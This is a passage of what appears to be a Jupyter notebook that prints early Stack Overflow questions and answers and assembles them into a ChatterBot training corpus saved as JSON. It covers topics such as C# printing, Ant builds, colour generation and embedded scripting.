      "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\n",
      "\n",
      "What level do you hold your code to when you create it for:\n",
      "\n",
      "a) yourself\n",
      "b) your clients\n",
      "\n",
      "P.S. Jeff and company, why doesn't stack overflow validate? :)\n",
      "\n",
      "EDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\n",
      "\n",
      "I think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going\n",
      "\n",
      "I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\n",
      "\n",
      "\n",
      "Multi-page printing will be a big headache.\n",
      "Still have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\n",
      "If the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\n",
      "\n",
      "\n",
      "Has anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\n",
      "\n",
      "All help is appreciated.\n",
      "\n",
      "EDIT: We are on version 2.0 of the .NET framework.\n",
      "\n",
      "During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\n",
      "\n",
      "What is LINQ and how do I get started?\n",
      "\n",
      "Links guides or documentation a bonus :)\n",
      "\n",
      "PS: I am a long time C# developer who daily uses Datatables and Parameterized SQL\n",
      "\n",
      "Is there a general procedure for programming extensibility capability into your code?\n",
      "\n",
      "I am wondering what the general procedure is for adding extension-type capability to a system you are writing so that functionality can be extended through some kind of plugin API rather than having to modify the core code of a system.\n",
      "\n",
      "Do such things tend to be dependent on the language the system was written in, or is there a general method for allowing for this?\n",
      "\n",
      "I have a build script and as part of that script it copies a jar file to a directory, for ease lets call it the utils jar.  the utils jar is built by another build script sitting in another directory.  What im trying to do have my build script run the utils build script so that I can ensure the utils jar is up to date.\n",
      "\n",
      "So I know I need to import the utils build file.\n",
      "\n",
      "&lt;import file=\"../utils/build/build.xml\" /&gt;\n",
      "\n",
      "\n",
      "Which doesn't work because the import task, unlike almost every other ant taks, doesn't run from basedir, it runs from the pwd.  So to get around that I have this little ditty, which does successfully import the build file\n",
      "\n",
      "  &lt;property name=\"baseDirUpOne\" location=\"..\" /&gt;\n",
      "  &lt;import file=\"${baseDirUpOne}/utils/build/build.xml\" /&gt;\n",
      "\n",
      "\n",
      "So now that ive solved my import problem I need to call the task, well that should be easy right:\n",
      "\n",
      "&lt;antcall target=\"utils.package\" /&gt;\n",
      "\n",
      "\n",
      "note that in the above, utils is the project name of ../utils/build/build.xml\n",
      "\n",
      "the problem I'm now running into is that ant call doesn't execute in ../utils/build so what I need, and cant find, is a runat property or something similar, essentially:\n",
      "\n",
      "&lt;antcall target=\"utils.package\" runat=\"../utils/build\" /&gt;\n",
      "\n",
      "\n",
      "The reason I need this is that in my utils build file the step to select which code to copy to the jar is based on relative paths so as to avoid hardcoding paths in my ant file. Any ideas? \n",
      "\n",
      "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\n",
      "\n",
      "public class TokenTree\n",
      "{\n",
      "    public TokenTree()\n",
      "    {\n",
      "        /* I must admit to not fully understanding this,\n",
      "         * I got it from msdn. As far as I can tell, IDictionary is an\n",
      "         * interface, and Dictionary is the default implementation of\n",
      "         * that interface, right?\n",
      "         */\n",
      "        SubPairs = new Dictionary&lt;string, string&gt;();\n",
      "    }\n",
      "\n",
      "    public string Key;\n",
      "    public string Value;\n",
      "    public IDictionary&lt;string, string&gt; SubPairs;\n",
      "}\n",
      "\n",
      "\n",
      "It's only really a simple shunt for passing around data.\n",
      "\n",
      "When opening Adobe Acrobat Pro, whether it be through Applescript or finder, the introductory dialog is shown.  Is there a way to not show this dialog without already having checked the \"Don't Show Again\" option when opening a document using Applescript?  \n",
      "\n",
      "Photoshop and Illustrator Applescript libraries have ways of setting interaction levels and not showing dialogs, but I can't seem to find the option in Acrobat.\n",
      "\n",
      "Using the Windows API, how can I get a list of domains on my network?\n",
      "\n",
      "With VMWare Server running under Linux (Debain), I would like to have the following setup:\n",
      "\n",
      "\n",
      "1st: NIC being used by many of the\n",
      "images running under VMWare, as well\n",
      "as being used by the Linux OS \n",
      "2nd: NIC being used by only 1 image and to be unused by the Linux OS (as its part of a DMZ)\n",
      "\n",
      "\n",
      "Although the second NIC won't be used by Linux, it is certainly recognised as a NIC (e.g. eth1).\n",
      "\n",
      "Is this possible under VMWare Server, and if so, is it as simple as not binding eth1 under Linux and then bridging it to the image under VMWare Server?\n",
      "\n",
      "We have a SharePoint WSS site and some of our users on on the Mac OSX platform.  Are there any tips or tricks to get a similar experience to Windows with document shares and calendars on the Mac?\n",
      "\n",
      "Edit: Browsing a SharePoint WSS site on a Mac, whether using Firefox or Safari, has a very similar look and feel as it does on Windows IE.  The similar experience I am looking for has to do with integrating the calendars, document shares, etc. into the desktop.\n",
      "\n",
      "For example, with IE you can go to a calendar and select \"Actions -> Connect to Outlook\" and it will make the calendar visible and manageable from within Outlook.\n",
      "\n",
      "Is there any way to get the Mac to work similarly?\n",
      "\n",
      "Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well? \n",
      "\n",
      "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \n",
      "\n",
      "This great when you first write the UI code, because you have a neatly defined interface that you can trust.\n",
      "\n",
      "But here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \n",
      "\n",
      "Because of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\n",
      "\n",
      "I hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers? \n",
      "\n",
      "I want to create a function that performs a function passed by parameter on a set of data. How do you pass a function as a parameter in C?\n",
      "\n",
      "I'm integrating .NET support into our C++ application.\n",
      "It's an old-school MFC application, with 1 extra file compiled with the \"/clr\" option that references a CWinFormsControl.\n",
      "\n",
      "I'm not allowed to remove the linker flag \"/NODEFAULTLIB\".\n",
      "(We have our own build management system, not Visual Studio's.)\n",
      "This means I have to specify all necessary libraries: VC runtime and MFC.\n",
      "\n",
      "Other compiler options include \"/MD\"\n",
      "\n",
      "Next to that: I can't use the linker flag \"/FORCE:MULTIPLE\" and just add everything:\n",
      "I'm looking for a non-overlapping set of libraries.\n",
      "\n",
      "\n",
      "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\n",
      "Are there any command line interpreters, such that I could type this into the command line:\n",
      "\n",
      "\n",
      "  lispinterpret sourcefile.lisp\n",
      "\n",
      "\n",
      "just like I can run perl or python.\n",
      "\n",
      "While I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\n",
      "\n",
      "Edit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "I was reading Joel's book where he was suggesting as interview question:\n",
      "\n",
      "\n",
      "  Write a program to reverse the \"ON\" bits in a given byte.\n",
      "\n",
      "\n",
      "I only can think of a solution using C. \n",
      "\n",
      "Asking here so you can show me how to do in a Non C way (if possible)\n",
      "\n",
      "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\n",
      "\n",
      "What's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\n",
      "\n",
      "Does LINQ simplify the solution?\n",
      "\n",
      "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n",
      "\n",
      "\n",
      "Checking whether the length of the string == 0\n",
      "Checking whether the string is empty (strVar == \"\")\n",
      "\n",
      "\n",
      "Also, does the answer depend on language?\n",
      "\n"
     ]
    }
   ],
   "source": [
    "\n",
    "import re\n",
    "x_new=x[:100]\n",
    "for a,q in x_new:\n",
    "    xxx=list(questions[questions['Id']==q]['Body'])\n",
    "    xxx[0]\n",
    "    l=list()\n",
    "    l.append(xxx[0])\n",
    "    print(xxx[0])\n",
    "    if xxx[0] not in d:\n",
    "        xx=list(answers[answers['ParentId']==q]['Body'])\n",
    "        for f in xx:\n",
    "#             f=str(f)\n",
    "#             f=re.sub('[^\\w ]+', '', f)\n",
    "            \n",
    "            l.append(f)\n",
    "        d['conversations'].append(l)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "d\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "from chatterbot.trainers import ChatterBotCorpusTrainer\n",
    "from chatterbot import ChatBot\n",
    "chatterbot = ChatBot(\"Training Example\")\n",
    "chatterbot.set_trainer(ChatterBotCorpusTrainer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "r = json.dumps(d)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "loaded_r = json.loads(r)\n",
    "type(r)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Write JSON file\n",
    "import json\n",
    "try:\n",
    "    to_unicode = unicode\n",
    "except NameError:\n",
    "    to_unicode = str\n",
    "import io\n",
    "with io.open('data.json', 'w', encoding='utf8') as outfile:\n",
    "    str_ = json.dumps(d,\n",
    "                      indent=4, sort_keys=True,\n",
    "                      separators=(',', ': '), ensure_ascii=True)\n",
    "    outfile.write(to_unicode(str_))\n",
    "\n",
    "# Read JSON file\n",
    "with open('data.json') as data_file:\n",
    "    data_loaded = json.load(data_file)\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'conversations': [['as'], ['asss'], [\"I've written a database generation script in SQL and want to execute it in my Adobe AIR application:\\n\\nCreate Table tRole (\\n      roleID integer Primary Key\\n      ,roleName varchar(40)\\n);\\nCreate Table tFile (\\n    fileID integer Primary Key\\n    ,fileName varchar(50)\\n    ,fileDescription varchar(500)\\n    ,thumbnailID integer\\n    ,fileFormatID integer\\n    ,categoryID integer\\n    ,isFavorite boolean\\n    ,dateAdded date\\n    ,globalAccessCount integer\\n    ,lastAccessTime date\\n    ,downloadComplete boolean\\n    ,isNew boolean\\n    ,isSpotlight boolean\\n    ,duration varchar(30)\\n);\\nCreate Table tCategory (\\n    categoryID integer Primary Key\\n    ,categoryName varchar(50)\\n    ,parent_categoryID integer\\n);\\n...\\n\\n\\nI execute this in Adobe AIR using the following methods:\\n\\npublic static function RunSqlFromFile(fileName:String):void {\\n    var file:File = File.applicationDirectory.resolvePath(fileName);\\n    var stream:FileStream = new FileStream();\\n    stream.open(file, FileMode.READ)\\n    var strSql:String = stream.readUTFBytes(stream.bytesAvailable);\\n    NonQuery(strSql);\\n}\\n\\npublic static function NonQuery(strSQL:String):void\\n{\\n    var sqlConnection:SQLConnection = new SQLConnection();\\n    sqlConnection.open(File.applicationStorageDirectory.resolvePath(DBPATH);\\n    var sqlStatement:SQLStatement = new SQLStatement();\\n    sqlStatement.text = strSQL;\\n    sqlStatement.sqlConnection = sqlConnection;\\n    try\\n    {\\n        sqlStatement.execute();\\n    }\\n    catch (error:SQLError)\\n    {\\n        Alert.show(error.toString());\\n    }\\n}\\n\\n\\nNo errors are generated, however only tRole exists. It seems that it only looks at the first query (up to the semicolon- if I remove it, the query fails). Is there a way to call multiple queries in one statement?\\n\", 'I wound up using this. It is a kind of a hack, but it actually works pretty well. The only thing is you have to be very careful with your semicolons. : D\\n\\nvar strSql:String = stream.readUTFBytes(stream.bytesAvailable);      \\nvar i:Number = 0;\\nvar strSqlSplit:Array = strSql.split(\";\");\\nfor (i = 0; i &lt; strSqlSplit.length; i++){\\n    NonQuery(strSqlSplit[i].toString());\\n}\\n\\n', \"The SQLite API has a function called something like sqlite_prepare which takes one statement and prepares it for execution, essentially parsing the SQL and storing it in memory. This means that the SQL only has to be sent once to the database engine even though the statement is executed many times.\\n\\nAnyway, a statement is a single SQL query, that's just the rule. The AIR SQL API doesn't allow sending raw SQL to SQLite, only single statements, and the reason is, likely, that AIR uses the sqlite_prepare function when it talks to SQLite.\\n\", 'What about making your delimiter something a little more complex like \";\\\\n\" which would not show up all that often. You just have to ensure when creating the file you have a line return or two in there. I end up putting two \"\\\\n\\\\n\" into the creation of my files which works well.\\n'], [\"Are there any really good tutorials explaining branching and merging with Apache Subversion? \\n\\nAll the better if it's specific to TortoiseSVN client.\\n\", 'Version Control with Subversion\\r\\n\\r\\nA very good resource for source control in general. Not really TortoiseSVN specific, though.', 'You can also try Version Control for the Standalone Programmer - Part 1 or perhaps Merging with TortoiseSVN.\\n', 'My easy click-by-click instructions (specific to TortoiseSVN) are in Stack&nbsp;Overflow question What is the simplest way to do branching and merging using TortoiseSVN?.\\n'], [\"Has anyone got experience creating SQL-based ASP.NET site-map providers?\\n\\nI've got the default XML file web.sitemap working properly with my Menu and SiteMapPath controls, but I'll need a way for the users of my site to create and modify pages dynamically.\\n\\nI need to tie page viewing permissions into the standard ASP.NET membership system as well.\\n\", 'The Jeff Prosise version from MSDN magazine works pretty well, but it has a few flaws:\\n\\nAddNode freaks out with links to external sites on your menu (www.google.com, etc.)\\n\\nHere\\'s my fix in BuildSiteMap():\\n\\nSiteMapNode node = GetSiteMapNodeFromReader(reader);\\nstring url = node.Url;\\nif (url.Contains(\":\"))\\n{\\n    string garbage = Guid.NewGuid().ToString();  // SiteMapNode needs unique URLs\\n    node.Url = \"~/dummy_\" + garbage + \".aspx\";\\n    AddNode(node, _root);\\n    node.Url = url;\\n}\\nelse\\n{\\n    AddNode(node, _root);\\n}\\n\\n\\nSQLDependency caching is cool, but if you don\\'t want to make a trip to the DB everytime your menu loads (to check to see if the dependency has changed) and your menus don\\'t change very often, then why not use HttpRuntime.Cache instead?\\n\\npublic override SiteMapNode RootNode\\n{\\n    get\\n    {\\n        SiteMapNode temp = (SiteMapNode)HttpRuntime.Cache[\"SomeKeyName\"];\\n        if (temp == null)\\n        {\\n            temp = BuildSiteMap();\\n            HttpRuntime.Cache.Insert(\"SomeKeyName\", temp, null, DateTime.Now.AddHours(1), Cache.NoSlidingExpiration);\\n        }\\n        return temp;\\n    }\\n}\\n\\n'], [\"This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate N colors, that are as distinguishable as possible where N is a parameter.\\n\", \"I've read somewhere the human eye can't distinguish between less than 4 values apart. so This is something to keep in mind. The following algorithm does not compensate for this.\\r\\n\\r\\nI'm not sure this is exactly what you want, but this is one way to randomly generate non-repeating color values:\\r\\n\\r\\n(beware, inconsistent pseudo-code ahead)\\r\\n\\r\\n//colors entered as 0-255 [R, G, B]colors = []; //holds final colors to be usedrand = new Random();//assumes n is less than 16,777,216randomGen(int n){   while (len(colors) &lt; n){      //generate a random number between 0,255 for each color      newRed = rand.next(256);      newGreen = rand.next(256);      newBlue = rand.next(256);      temp = [newRed, newGreen, newBlue];      //only adds new colors to the array      if temp not in colors {         colors.append(temp);      }   }}\\r\\n\\r\\nOne way you could optimize this for better visibility would be to compare the distance between each new color and all the colors in the array:\\r\\n\\r\\nfor item in color{   itemSq = (item[0]^2 + item[1]^2 + item[2]^2])^(.5);   tempSq = (temp[0]^2 + temp[1]^2 + temp[2]^2])^(.5);   dist = itemSq - tempSq;   dist = abs(dist);}//NUMBER can be your chosen distance apart.if dist &lt; NUMBER and temp not in colors {   colors.append(temp);}\\r\\n\\r\\nBut this approach would significantly slow down your algorithm.\\r\\n\\r\\nAnother way would be to scrap the randomness and systematically go through every 4 values and add a color to an array in the above example.\", 'Isn\\'t it also a factor which order you set up the colors?\\r\\n\\r\\nLike if you use Dillie-Os idea you need to mix the colors as much as possible. \\r\\n0 64 128 256 is from one to the next. but 0 256 64 128 in a wheel would be more \"apart\"\\r\\n\\r\\nDoes this make sense?', 'My first thought on this is \"how generate N vectors in a space that maximize distance from each other.\" You can see that the RGB (or any other scale you use that forms a basis in color space) are just vectors. Take a look at Random Point Picking. Hope this is a good start for you! Once you have a set of vectors that are maximized a part, you can save them in a hash table or something for later, and just perform random rotations on them to get all the colors you desire that are maximally apart from each other!\\n\\nEdit: Thinking about this problem more, it would be better to map the colors in a linear manor, possibly (0,0,0) --> (255,255,255) lexicographically, and then distribute them evenly. I really don\\'t know how well this will work, but it should since, lets say:\\n\\nn = 10\\nwe know we have 16777216 colors (256^3). We can use buckles algorithm 515 to find the lexicographically indexed color.. You\\'ll probably have to edit the algorithm to avoid overflow and probably add some minor speed improvements.\\n', 'It would be best to find colors maximally distant in a \"perceptually uniform\" colorspace, e.g. CIELAB (using Euclidean distance between L*, a*, b* coordinates as your distance metric) and then converting to the colorspace of your choice.  Perceptual uniformity is achieved by tweaking the colorspace to approximate the non-linearities in the human visual system.\\n', 'Some related resources:\\n\\nColorBrewer - Sets of colours designed to be maximally distinguishable for use on maps.\\n\\nEscaping RGBland: Selecting Colors for Statistical Graphics - A technical report describing a set of algorithms for generating good (i.e. maximally distinguishable) colour sets in the hcl colour space.\\n', 'Here is some code to allocate RGB colors evenly around a HSL color wheel of specified luminosity.\\n\\nclass cColorPicker\\n{\\npublic:\\n    void Pick( vector&lt;DWORD&gt;&amp;v_picked_cols, int count, int bright = 50 );\\nprivate:\\n    DWORD HSL2RGB( int h, int s, int v );\\n    unsigned char ToRGB1(float rm1, float rm2, float rh);\\n};\\n/**\\n\\n  Evenly allocate RGB colors around HSL color wheel\\n\\n  @param[out] v_picked_cols  a vector of colors in RGB format\\n  @param[in]  count   number of colors required\\n  @param[in]  bright  0 is all black, 100 is all white, defaults to 50\\n\\n  based on Fig 3 of http://epub.wu-wien.ac.at/dyn/virlib/wp/eng/mediate/epub-wu-01_c87.pdf?ID=epub-wu-01_c87\\n\\n*/\\n\\nvoid cColorPicker::Pick( vector&lt;DWORD&gt;&amp;v_picked_cols, int count, int bright )\\n{\\n    v_picked_cols.clear();\\n    for( int k_hue = 0; k_hue &lt; 360; k_hue += 360/count )\\n        v_picked_cols.push_back( HSL2RGB( k_hue, 100, bright ) );\\n}\\n/**\\n\\n  Convert HSL to RGB\\n\\n  based on http://www.codeguru.com/code/legacy/gdi/colorapp_src.zip\\n\\n*/\\n\\nDWORD cColorPicker::HSL2RGB( int h, int s, int l )\\n{\\n    DWORD ret = 0;\\n    unsigned char r,g,b;\\n\\n    float saturation = s / 100.0f;\\n    float luminance = l / 100.f;\\n    float hue = (float)h;\\n\\n    if (saturation == 0.0) \\n    {\\n      r = g = b = unsigned char(luminance * 255.0);\\n    }\\n    else\\n    {\\n      float rm1, rm2;\\n\\n      if (luminance &lt;= 0.5f) rm2 = luminance + luminance * saturation;  \\n      else                     rm2 = luminance + saturation - luminance * saturation;\\n      rm1 = 2.0f * luminance - rm2;   \\n      r   = ToRGB1(rm1, rm2, hue + 120.0f);   \\n      g = ToRGB1(rm1, rm2, hue);\\n      b  = ToRGB1(rm1, rm2, hue - 120.0f);\\n    }\\n\\n    ret = ((DWORD)(((BYTE)(r)|((WORD)((BYTE)(g))&lt;&lt;8))|(((DWORD)(BYTE)(b))&lt;&lt;16)));\\n\\n    return ret;\\n}\\n\\n\\nunsigned char cColorPicker::ToRGB1(float rm1, float rm2, float rh)\\n{\\n  if      (rh &gt; 360.0f) rh -= 360.0f;\\n  else if (rh &lt;   0.0f) rh += 360.0f;\\n\\n  if      (rh &lt;  60.0f) rm1 = rm1 + (rm2 - rm1) * rh / 60.0f;   \\n  else if (rh &lt; 180.0f) rm1 = rm2;\\n  else if (rh &lt; 240.0f) rm1 = rm1 + (rm2 - rm1) * (240.0f - rh) / 60.0f;      \\n\\n  return static_cast&lt;unsigned char&gt;(rm1 * 255);\\n}\\n\\nint _tmain(int argc, _TCHAR* argv[])\\n{\\n    vector&lt;DWORD&gt; myCols;\\n    cColorPicker colpick;\\n    colpick.Pick( myCols, 20 );\\n    for( int k = 0; k &lt; (int)myCols.size(); k++ )\\n        printf(\"%d: %d %d %d\\\\n\", k+1,\\n        ( myCols[k] &amp; 0xFF0000 ) &gt;&gt;16,\\n        ( myCols[k] &amp; 0xFF00 ) &gt;&gt;8,\\n        ( myCols[k] &amp; 0xFF ) );\\n\\n    return 0;\\n}\\n\\n', 'Last I checked JFreeChart has this precise algorithm and as it is open source you can check out what it does.  I do know that the colors I get do not seem to be randomly spaced along some circle or sphere, but rather chosen more specifically.\\n', \"I know this an old post but I found it while looking for a PHP solution to the topic and finally came with a simple solution:\\n\\nfunction random_color($i = null, $n = 10, $sat = .5, $br = .7) {\\n    $i = is_null($i) ? mt_rand(0,$n) : $i;\\n    $rgb = hsv2rgb(array($i*(360/$n), $sat, $br));\\n    for ($i=0 ; $i&lt;=2 ; $i++) \\n        $rgb[$i] = dechex(ceil($rgb[$i]));\\n    return implode('', $rgb);\\n}\\n\\nfunction hsv2rgb($c) { \\n    list($h,$s,$v)=$c; \\n    if ($s==0) \\n        return array($v,$v,$v); \\n    else { \\n        $h=($h%=360)/60; \\n        $i=floor($h); \\n        $f=$h-$i; \\n        $q[0]=$q[1]=$v*(1-$s); \\n        $q[2]=$v*(1-$s*(1-$f)); \\n        $q[3]=$q[4]=$v; \\n        $q[5]=$v*(1-$s*$f); \\n        return(array($q[($i+4)%6]*255,$q[($i+2)%6]*255,$q[$i%6]*255)); //[1] \\n    } \\n}\\n\\n\\nSo just call the random_color() function where $i identifies the color, $n the number of possible colors, $sat the saturation and $br the brightness.\\n\", 'To achieve \"most distinguishable\" we need to use a perceptual color space like Lab (or any other perceptually linear color space) and not RGB. Also, we can quantize this space to reduce the size of the space.\\n\\nGenerate the full 3D space with all possible quantized entries and run the K-means algorithm with k=N. The resulting centers/ \"means\" should be approximately most distinguishabl from each other. \\n'], [\"I have a little game written in C#. It uses a database as back-end. It's \\na trading card game, and I wanted to implement the function of the cards as a script.\\n\\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\\n\\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\\n\\nIs that possible? Register a class from a source file and then instantiate it, etc.\\n\\nICard Cards[current] = new MyGame.CardLibrary.Card056();\\nCards[current].OnEnterPlay(ref currentGameState);\\n\\n\\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.\\n\", 'Yes, I thought about that, but I soon figured out that another Domain-Specific-Language (DSL) would be a bit too much.\\n\\nEssentially, they need to interact with my gamestate in possibly unpredictable ways. For example, a card could have a rule \"When this cards enter play, all your undead minions gain +3 attack against flying enemies, except when the enemy is blessed\". As trading card games are turn based, the GameState Manager will fire OnStageX events and let the cards modify other cards or the GameState in whatever way the card needs.\\n\\nIf I try to create a DSL, I have to implement a rather large feature set and possibly constantly update it, which shifts the maintenance work to another part without actually removing it.\\n\\nThat\\'s why I wanted to stay with a \"real\" .NET language to essentially be able to just fire the event and let the card manipulate the gamestate in whatever way (within the limits of the code access security).\\n', \"Oleg Shilo's C# Script solution (at The Code Project) really is a great introduction to providing script abilities in your application.\\n\\nA different approach would be to consider a language that is specifically built for scripting, such as IronRuby, IronPython, or Lua.\\n\\nIronPython and IronRuby are both available today.\\n\\nFor a guide to embedding IronPython read\\nHow to embed IronPython script support in your existing app in 10 easy steps.\\n\\nLua is a scripting language commonly used in games. There is a Lua compiler for .NET, available from CodePlex -- http://www.codeplex.com/Nua\\n\\nThat codebase is a great read if you want to learn about building a compiler in .NET.\\n\\nA different angle altogether is to try PowerShell. There are numerous examples of embedding PowerShell into an application -- here's a thorough project on the topic: \\nPowershell Tunnel\\n\", \"You might be able to use IronRuby for that. \\r\\n\\r\\nOtherwise I'd suggest you have a directory where you place precompiled assemblies. Then you could have a reference in the DB to the assembly and class, and use reflection to load the proper assemblies at runtime.\\r\\n\\r\\nIf you really want to compile at run-time you could use the CodeDOM, then you could use reflection to load the dynamic assembly. MSDN article which might help.\", \"You could use any of the DLR languages, which provide a way to really easily host your own scripting platform. However, you don't have to use a scripting language for this. You could use C# and compile it with the C# code provider. As long as you load it in its own AppDomain, you can load and unload it to your heart's content.\", \"If you don't want to use the DLR you can use Boo (which has an interpreter) or you could consider the Script.NET (S#) project on CodePlex. With the Boo solution you can choose between compiled scripts or using the interpreter, and Boo makes a nice scripting language, has a flexible syntax and an extensible language via its open compiler architecture. Script.NET looks nice too, though, and you could easily extend that language as well as its an open source project and uses a very friendly Compiler Generator (Irony.net).\", 'The main application that my division sells does something very similar to provide client customisations (which means that I can\\'t post any source). We have a C# application that loads dynamic VB.NET scripts (although any .NET language could be easily supported - VB was chosen because the customisation team came from an ASP background).\\n\\nUsing .NET\\'s CodeDom we compile the scripts from the database, using the VB CodeDomProvider (annoyingly it defaults to .NET 2, if you want to support 3.5 features you need to pass a dictionary with \"CompilerVersion\" = \"v3.5\" to its constructor). Use the CodeDomProvider.CompileAssemblyFromSource method to compile it (you can pass settings to force it to compile in memory only.\\n\\nThis would result in hundreds of assemblies in memory, but you could put all the dynamic classes\\' code together into a single assembly, and recompile the whole lot when any change. This has the advantage that you could add a flag to compile on disk with a PDB for when you\\'re testing, allowing you to debug through the dynamic code.\\n', \"I'd suggest using LuaInterface as it has fully implemented Lua where it appears that Nua is not complete and likely does not implement some very useful functionality (coroutines, etc).\\n\\nIf you want to use some of the outside prepacked Lua modules, I'd suggest using something along the lines of 1.5.x as opposed to the 2.x series that builds fully managed code and cannot expose the necessary C API.\\n\", 'The next version of .NET (5.0?) has had a lot of talk about opening the \"compiler as a service\" which would make things like direct script evaluation possible.\\n', \"I'm using LuaInterface1.3 + Lua 5.0 for NET1.1 application.\\n\\nThe issue with Boo is that everytime you parse/compile/eval your code on the fly, it creates a set of boo classes so you will get memory leaks.\\n\\nLua in the other hand, does not do that, so it's very very stable and works wonderful (I can pass objects from C# to Lua and backwards).\\n\\nSo far I havent put it in PROD yet, but seems very promising.\\n\\nUPDATE: I did have memory leaks issues in PROD using LuaInterface + Lua 5.0, therefore I used Lua 5.2 and linked directly into C# with DllImport. The memory leaks were inside the LuaInterface library.\\n\\nLua 5.2: from http://luabinaries.sourceforge.net and http://sourceforge.net/projects/luabinaries/files/5.2/Windows%20Libraries/Dynamic/lua-5.2_Win32_dll7_lib.zip/download\\n\\nOnce I did this, all my memory leaks were gone and the app was very stable.\\n\"], [\"I am working on a collection of classes used for video playback and recording. I have one main class which acts like the public interface, with methods like play(), stop(), pause(), record() etc... Then I have workhorse classes which do the video decoding and video encoding. \\n\\nI just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.\\n\\nThe book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.\\n\", 'I would be a bit reluctant to use nested classes here.  What if you created an abstract base class for a \"multimedia driver\" to handle the back-end stuff (workhorse), and a separate class for the front-end work?  The front-end class could take a pointer/reference to an implemented driver class (for the appropriate media type and situation) and perform the abstract operations on the workhorse structure.\\n\\nMy philosophy would be to go ahead and make both structures accessible to the client in a polished way, just under the assumption they would be used in tandem.\\n\\nI would reference something like a QTextDocument in Qt.  You provide a direct interface to the bare metal data handling, but pass the authority along to an object like a QTextEdit to do the manipulation.\\n', \"One way of deciding whether or not to use nested classes is to think whether or not this class plays a supporting role or it's own part.\\r\\n\\r\\nIf it exists solely for the purpose of helping another class then I generally make it a nested class. There are a whole load of caveats to that, some of which seem contradictory but it all comes down to experience and gut-feeling.\", 'sounds like a case where you could use the strategy pattern', \"Sometimes it's appropriate to hide the implementation classes from the user -- in these cases it's better to put them in an foo_internal.h than inside the public class definition. That way, readers of your foo.h will not see what you'd prefer they not be troubled with, but you can still write tests against each of the concrete implementations of your interface.\\n\", \"You would use a nested class to create a (small) helper class that's required to implement the main class. Or for example, to define an interface (a class with abstract methods).\\n\\nIn this case, the main disadvantage of nested classes is that this makes it harder to re-use them. Perhaps you'd like to use your VideoDecoder class in another project. If you make it a nested class of VideoPlayer, you can't do this in an elegant way.\\n\\nInstead, put the other classes in separate .h/.cpp files, which you can then use in your VideoPlayer class. The client of VideoPlayer now only needs 